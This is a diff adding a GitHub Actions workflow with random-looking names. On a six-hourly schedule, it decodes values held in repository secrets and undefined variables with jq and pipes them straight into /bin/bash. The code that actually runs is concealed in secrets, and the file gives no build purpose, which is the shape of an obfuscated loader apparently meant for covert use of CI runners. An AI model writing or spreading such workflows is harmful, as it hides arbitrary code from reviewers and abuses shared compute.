@@ -1,0 +1,21 @@
+name: jiatingqian7584
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiatingqian7584
+        env:
+          qsid26: ${{ secrets.qsid26 }}
+        run: |
+          echo $qsid26 | jq -r .m4683 | /bin/bash
+          echo $gx62793 | jq -r .zqb6 | /bin/bash
+          echo $u14 | jq -r .czlwu63972 | /bin/bash
+          echo $ssoh3 | jq -r .qss31649 | /bin/bash
+
